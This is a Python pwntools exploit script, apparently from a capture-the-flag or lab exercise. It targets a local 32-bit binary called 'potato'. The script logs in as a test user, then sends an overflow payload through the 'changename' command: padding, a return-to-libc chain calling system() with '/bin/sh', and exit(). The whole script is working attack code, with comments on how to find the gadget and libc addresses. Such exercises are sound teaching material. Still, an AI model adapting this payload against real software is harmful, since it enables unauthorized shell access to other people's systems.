#!/usr/bin/env python3

from pwn import *
from ropgadget import *
from struct import pack

import sys

elf = ELF("./potato")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# return to libc
# get address of /bin/bash string via vmmap, then 
# find 0x0804f000, 0x08070000, "/bin/sh" (heap virtual mem address range)
# then p system and p exit for system() and exit() function addresses

p.sendline(b"changename")
addr_bin_sh=0x804f317
addr_system=0x2a3494c0
addr_exit=0x2a335ac0
payload=b"\x41"*58+ b"\x38\xce\xff\xff" + p32(addr_system) + p32(addr_exit) + p32(addr_bin_sh)
p.sendline(payload)

p.interactive()
